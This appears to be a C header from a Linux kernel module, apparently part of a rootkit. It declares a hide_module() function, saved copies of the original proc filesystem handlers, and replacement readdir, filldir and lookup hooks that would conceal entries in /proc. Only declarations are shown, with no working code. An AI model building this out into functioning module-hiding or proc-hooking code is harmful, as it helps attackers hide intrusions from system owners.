#include <linux/version.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netdevice.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/skbuff.h>
#include <linux/kmod.h>
#include <linux/interrupt.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

extern void hide_module(void);

// Structs to backup previous proc fs handlers.
extern struct file_operations proc_original_file_operations;
extern struct inode_operations proc_original_inode_operations;

// new handlers.
extern int new_proc_readdir(struct file *a, void *b, filldir_t c);
extern int new_proc_filldir(void *__buf, const char * name, int namelen, loff_t offset, ino_t ino, unsigned u);
extern struct dentry * new_proc_lookup(struct inode *i, struct dentry *d, struct nameidata *nd);



